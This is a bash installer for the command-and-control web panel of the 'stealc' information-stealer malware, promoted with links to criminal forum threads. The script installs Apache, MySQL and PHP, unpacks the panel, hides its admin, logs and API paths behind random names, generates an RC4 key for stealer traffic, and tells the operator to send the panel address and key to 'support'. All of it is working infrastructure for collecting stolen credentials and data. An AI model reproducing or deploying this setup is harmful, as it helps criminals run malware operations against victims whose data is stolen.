#!/bin/bash
#### edit -> EOL conversion -> Unix/OSX

echo "                     _                  ______  "
echo "      _             | |                (_____ \ "
echo "  ___| |_  ____ ____| | ____       _   _ ____) )"
echo " /___)  _)/ _  ) _  | |/ ___)     | | | /_____/ "
echo "|___ | |_( (/ ( ( | | ( (___ ______\ V /_______ "
echo "(___/ \___)____)_||_|_|\____|_______)_/(_______)"
echo "                                                "
echo "      stealc stealer web panel installer"
echo ""
echo "powerful native stealer writed on C++"
echo ""
echo "forum topics:"
echo "	- https://xss.is/threads/79592/"
echo "	- https://bhf.im/threads/666154/"
echo "	"

set -e

if [ "$(id -u)" -ne 0 ]; then
    echo "Run script as root."
    exit 1
fi

get_server_addr() {
    while true; do
        read -p "Enter your server IP or domain for admin panel: " server_addr
        if [ -z "$server_addr" ]; then
            echo "The address cannot be empty. Please try again."
            continue
        fi
        read -p "You entered '$server_addr'. Is that correct? (yes/no): " confirm
        case "$confirm" in
            yes|YES|y|Y) break ;;
            *) echo "Let's try again." ;;
        esac
    done
}

get_server_addr

echo "Using server address: $server_addr"

install_dir="/var/www/html"

db_name="main_db"
db_user=$db_name

if command -v uuidgen >/dev/null 2>&1; then
    db_password=$(uuidgen | tr -d '-' | cut -c1-16)
    mysqlrootpass=$(uuidgen | tr -d '-' | cut -c1-16)
    admin_panel_folder=$(uuidgen | tr -d '-' | cut -c1-16)
    admin_panel_logs_folder=$(uuidgen | tr -d '-' | cut -c1-16)
    admin_panel_api_name=$(uuidgen | tr -d '-' | cut -c1-16)
	rc4_key=$(uuidgen | tr -d '-' | cut -c1-16)
else
    # Альтернативный способ (менее надёжный)
    db_password=$(date | md5sum | cut -c '1-16')
    sleep 1
    mysqlrootpass=$(date | md5sum | cut -c '1-16')
    sleep 1
    admin_panel_folder=$(date | md5sum | cut -c '1-16')
    sleep 1
    admin_panel_logs_folder=$(date | md5sum | cut -c '1-16')
    sleep 1
    admin_panel_api_name=$(date | md5sum | cut -c '1-16')
	sleep 1
    rc4_key=$(date | md5sum | cut -c '1-16')
fi

echo "----------------------------------------------------------------"
echo "Updating package list and updating system..."
apt -y update

echo "----------------------------------------------------------------"
echo "Installing the required packages..."
apt -y install unzip
apt -y install apache2
apt -y install mysql-server
apt -y install at
apt -y install php
apt -y install php-mysqli
apt -y install php-curl
apt -y install php-intl 
apt -y install php-common
apt -y install php-mbstring
apt -y install php-zip
apt -y install php-pear
apt -y install php-dev
apt -y install libleveldb-dev
apt -y install php-gd
apt -y install php-sqlite3

echo "----------------------------------------------------------------"
echo "Launch and setup Apache..."
rm -f /var/www/html/index.html
systemctl enable apache2
systemctl start apache2

echo "----------------------------------------------------------------"
echo "Setup MySQL..."
mysql --user=root <<EOF
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '$mysqlrootpass';
FLUSH PRIVILEGES;
CREATE DATABASE IF NOT EXISTS $db_name;
CREATE USER '$db_user'@'localhost' IDENTIFIED BY '$db_password';
GRANT ALL PRIVILEGES ON $db_name.* TO '$db_user'@'localhost';
FLUSH PRIVILEGES;
EOF

echo "----------------------------------------------------------------"
echo "Setup AT..."
if ! grep -q "^www-data\$" /etc/at.allow; then
    echo "www-data" >> /etc/at.allow
fi

echo "----------------------------------------------------------------"
echo "Install leveldb for PHP..."
printf "\n" | pecl install channel://pecl.php.net/leveldb-0.3.0

php_version=$(php -r 'echo PHP_MAJOR_VERSION.".".PHP_MINOR_VERSION;')
echo "extension=leveldb.so" > /etc/php/${php_version}/mods-available/leveldb.ini
echo "extension=sqlite3" > /etc/php/${php_version}/mods-available/sqlite3.ini
phpenmod leveldb
phpenmod sqlite3

php_ini_file=$(php --ini | grep "Loaded Configuration File" | awk '{print $4}')
sed -i -E "s/^[;#]?\s*memory_limit\s*=.*/memory_limit = 4G/" "$php_ini_file"
sed -i -E "s/^[;#]?\s*post_max_size\s*=.*/post_max_size = 1G/" "$php_ini_file"
sed -i -E "s/^[;#]?\s*upload_max_filesize\s*=.*/upload_max_filesize = 1G/" "$php_ini_file"
sed -i -E "s/^[;#]?\s*max_execution_time\s*=.*/max_execution_time = 180/" "$php_ini_file"

systemctl restart apache2

echo "----------------------------------------------------------------"
echo "Creating /var/www/temp..."
mkdir -p /var/www/temp
chown www-data:www-data /var/www/temp
chmod 755 /var/www/temp

echo "----------------------------------------------------------------"
echo "Unzip admin panel..."
if ! grep -q "<Directory /var/www/html/>" /etc/apache2/apache2.conf; then
    cat <<EOF >> /etc/apache2/apache2.conf

<Directory /var/www/html/>
    Options -Indexes +FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>
EOF
    systemctl reload apache2
fi

if [ -f "www.zip" ]; then
    unzip -qq www.zip -d $install_dir
	chown -R www-data:www-data $install_dir
else
    echo "File www.zip not found. Check location of web panel archive."
    exit 1
fi

echo "----------------------------------------------------------------"
echo "Creating a configuration file $install_dir/config.php..."
cat << EOF > $install_dir/config.php
<?php
define('SERVER_ADDR',   "$server_addr");
define('PANEL_PATH',    "$admin_panel_folder");
define('LOGS_PATH',     "$admin_panel_logs_folder");
define('DB_HOST',       "localhost");
define('DB_USER',       "$db_user");
define('DB_PASS',       "$db_password");
define('DB_NAME',       "$db_name");
define('RC4_KEY',       "$rc4_key");
?>
EOF

echo "----------------------------------------------------------------"
echo "Creating a configuration file $install_dir/.htaccess..."
cat << EOF > $install_dir/.htaccess
RewriteEngine On
RewriteBase /

RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME}.php -f
RewriteRule ^(.*)$ \$1.php [L,QSA]

Options -Indexes
ErrorDocument 403 /error.html
ErrorDocument 404 /error.html
EOF

echo "----------------------------------------------------------------"
echo "Import database..."
if [ -f "$install_dir/database.sql" ]; then
    mysql --user=root --password="$mysqlrootpass" $db_name < $install_dir/database.sql
else
    echo "File database.sql not found in $install_dir!"
fi

echo "----------------------------------------------------------------"
echo "Creating a folder for admin panel logs /var/www/$admin_panel_logs_folder..."

mv $install_dir/admin $install_dir/$admin_panel_folder
mv $install_dir/logs $install_dir/$admin_panel_logs_folder
mv $install_dir/api.php $install_dir/$admin_panel_api_name.php
rm -rf $install_dir/database.sql

echo "----------------------------------------------------------------"
echo "Mod Rewrite..."
sudo a2enmod rewrite
sudo systemctl restart apache2

echo "----------------------------------------------------------------"
echo "██ ██     ██  █████  ██████  ███    ██ ██ ███    ██  ██████  ██ "
echo "██ ██     ██ ██   ██ ██   ██ ████   ██ ██ ████   ██ ██       ██ "
echo "██ ██  █  ██ ███████ ██████  ██ ██  ██ ██ ██ ██  ██ ██   ███ ██ "
echo "   ██ ███ ██ ██   ██ ██   ██ ██  ██ ██ ██ ██  ██ ██ ██    ██    "
echo "██  ███ ███  ██   ██ ██   ██ ██   ████ ██ ██   ████  ██████  ██ "
echo "                                                                "
echo "                       !!!SAVE THIS!!!"
echo ""
echo "database"
echo "- name             : "$db_name
echo "- user             : "$db_user
echo "- password         : "$db_password
echo "- password for root: "$mysqlrootpass
echo ""
echo "admin panel"
echo "    path           : http://"$server_addr"/"$admin_panel_folder"/login"
echo "    login          : admin"
echo "    password       : admin"
echo ""
echo "send this data to support:"
echo "    server address : http://"$server_addr"/"$admin_panel_api_name.php
echo "    encrypted key  : "$rc4_key
echo ""
echo "installation complete!"